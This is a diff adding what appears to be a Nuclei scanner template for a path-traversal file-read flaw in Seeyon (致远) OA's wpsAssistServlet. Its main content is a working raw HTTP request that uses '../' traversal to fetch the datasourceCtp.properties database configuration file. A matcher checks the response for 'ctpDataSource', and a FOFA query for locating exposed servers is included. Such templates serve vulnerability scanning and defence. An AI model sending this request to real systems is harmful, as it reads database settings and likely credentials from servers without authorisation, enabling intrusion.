@@ -1,0 +1,24 @@
+id: seeyon-wpsAssistServlet-fileread
+
+info:
+  name: 致远 OA wpsassistservlet - fileread
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: body="seeyon/index.jsp"
+  tags: seeyon,fileread,oa
+
+http:
+  - raw:
+      - |
+        GET /seeyon/wpsAssistServlet?flag=open&fileId=-1233531&fileType=/../../conf/datasourceCtp.properties HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains(body,"ctpDataSource")
